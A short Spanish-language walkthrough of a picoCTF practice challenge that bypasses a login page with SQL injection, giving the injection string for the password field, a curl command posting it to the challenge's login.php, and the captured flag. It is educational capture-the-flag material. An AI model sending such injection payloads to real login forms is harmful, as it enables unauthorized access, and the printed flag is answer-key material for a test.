https://play.picoctf.org/practice/challenge/80
## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
## Solución
1. Nos vamos a la página que nos indica. Vamos a la parte del login y probamos las credenciales mas comunes: admin admin. No funcionan.
2. Probamos la inyección SQL en user:"admin" y en password:"alo ' or 1\==1;"
3. Esto nos arroja la bandera: ```picoCTF{s0m3_SQL_fb3fe2ad}```

## Notas adicionales

También es posible desde terminal con:
``` curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password= ' or 1==1;"```

## Referencias

https://www.w3schools.com/sql/sql_injection.asp

https://www.youtube.com/watch?v=0EDbUSDqrng&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=7